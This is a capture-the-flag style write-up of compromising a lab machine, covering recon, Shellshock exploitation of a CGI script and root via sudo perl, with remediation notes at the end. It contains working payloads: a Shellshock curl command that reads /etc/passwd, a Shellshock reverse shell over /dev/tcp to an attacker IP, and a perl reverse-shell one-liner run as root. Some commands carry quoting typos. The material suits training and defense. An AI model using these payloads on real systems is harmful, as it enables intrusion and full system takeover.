1. Recon

> 80 - HTTP - Apache 2.4.18 (ubuntu)
- Dirb and Foff revealed directory /cgi-bin and a file ./user.sh
- cgi-bin is restricted, however user.sh is accessible and is running command on web server for up time

> 2222 - SSH OpenSSH 7.2p2


2. Initial Access
- checked ./user.sh with shellshock payload (bash script) in User-Agent Header
```
curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c `cat /etc/passwd'" http://10.10.10.56:80/cgi-bin/user.sh
```
- script ran successfully and got access to /etc/passwd file
- given bash tcp revershe shell in script and started listening on attacker machine
```
curl -H "user-agent: () {:;}; echo; echo; /bin/bash -c '0<&196; exec 196<>/dev/tcp/10.10.14.63/4444; sh <&196 > '" http://10.10.10.56:80/cgi-bin/user.sh
- got reverse tcp shell
```
3. Post Exploit
- Checked sudo privileges for user 
```
# sudo -l
(root) NOPASSWD: /usr/bin/perl
```
- found user can run perl script as root using sudo

4. Privilege Escalation 
- Checked sudo privileges for user 
```
# sudo -l
(root) NOPASSWD: /usr/bin/perl
```
- found user can run perl script as root using sudo
- gave reverse shell using perl script
```
sudo perl -e 'use Socket;$i="10.10.14.63";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```


5. Getting Root
- Got root since executed perl as sudo privilege


6. Remediations and Best Practices

- Security Misconfiguration: Although the access to “/cgi-bin” was restricted using fuzzing techniques it was possible to identify “user.sh” for more info visit

- Server is running verlnerable version of bash, Shellshock is a security bug in the Bash shell (GNU Bash up to version 4.3) that causes Bash to execute unintentional bash commands from environment variables. 

- Unnecessory SUDO privilege allowed to normal user which can allow script execution


> References
https://serverpilot.io/docs/how-to-create-a-cgi-bin-directory/
https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/